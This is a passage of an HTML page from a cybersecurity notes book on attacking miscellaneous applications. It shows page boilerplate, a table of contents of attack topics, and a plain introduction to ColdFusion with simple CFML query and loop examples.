@@ -1,0 +1,1235 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Misc Applications - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../favicon.png">
+        <link rel="stylesheet" href="../../../css/variables.css">
+        <link rel="stylesheet" href="../../../css/general.css">
+        <link rel="stylesheet" href="../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#attacking-miscellaneous-applications">Attacking Miscellaneous Applications</a>
+<ul>
+<li><a href="#coldfusion">ColdFusion</a>
+<ul>
+<li><a href="#enumeration">Enumeration</a></li>
+<li><a href="#attacking-coldfusion">Attacking ColdFusion</a>
+<ul>
+<li><a href="#directory-traversal">Directory Traversal</a></li>
+<li><a href="#unauthenticated-rce">Unauthenticated RCE</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#iis-tilde-enumeration">IIS Tilde Enumeration</a>
+<ul>
+<li><a href="#enumeration-1">Enumeration</a>
+<ul>
+<li><a href="#tilde-enumeration-using-iis-shortname-scanner">Tilde Enumeration using IIS ShortName Scanner</a></li>
+<li><a href="#generate-wordlist">Generate Wordlist</a></li>
+<li><a href="#gobuster-enumeration">Gobuster Enumeration</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ldap">LDAP</a>
+<ul>
+<li><a href="#ldapsearch">ldapsearch</a></li>
+<li><a href="#ldap-injection">LDAP Injection</a></li>
+<li><a href="#enumeration-2">Enumeration</a></li>
+</ul>
+</li>
+<li><a href="#web-mass-assignment">Web Mass Assignment</a>
+<ul>
+<li><a href="#exploit-mass-assignment">Exploit Mass Assignment</a></li>
+<li><a href="#prevention">Prevention</a></li>
+</ul>
+</li>
+<li><a href="#applications-connecting-to-services">Applications Connecting to Services</a>
+<ul>
+<li><a href="#elf-executable-examination">ELF Executable Examination</a></li>
+<li><a href="#dll-file-examination">DLL File Examination</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="attacking-miscellaneous-applications"><a class="header" href="#attacking-miscellaneous-applications">Attacking Miscellaneous Applications</a></h1>
+<h2 id="coldfusion"><a class="header" href="#coldfusion">ColdFusion</a></h2>
+<p>... is a programming language and a web app development platform based on Java.</p>
+<p>It is used to build dynamic and interactive web apps that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion was first released in 1995 and has since evolved into a powerful and versatile platform for web dev.</p>
+<p>ColdFusion Markup Language (<em>CFML</em>) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web devs. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies development by reducing the amount of code needed to accomplish complex tasks. For instace, the <code>cfquery</code> tag can execute SQL statements to retrieve data from a database:</p>
+<pre><code class="language-html">&lt;cfquery name="myQuery" datasource="myDataSource"&gt;
+  SELECT *
+  FROM myTable
+&lt;/cfquery&gt;
+</code></pre>
+<p>Devs can the use the <code>cfloop</code> tag to iterate through the records retrieved from the database.</p>
+<pre><code class="language-html">&lt;cfloop query="myQuery"&gt;
+  &lt;p&gt;#myQuery.firstName# #myQuery.lastName#&lt;/p&gt;
+&lt;/cfloop&gt;
+</code></pre>
+<p>Thanks to its built-in functions and features, CFML enables devs to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to user their preferred programming language within the ColdFusion environment.</p>
+<p>ColdFusion also offers support for email, PDF manipulation, graphing, and other commonly used features. The applications developed using ColdFusion can run on any server that supports its runtime. It is available for download from Adobe's website and can be installed on Windows, Mac, or Linux OS. ColdFusion applications can also be deployed on cloud platforms like Amazon Web Services or Microsoft Azure. Some of the primary purposes and benefits of ColdFusion include:</p>
+<div class="table-wrapper"><table><thead><tr><th>Benefits</th><th>Description</th></tr></thead><tbody>
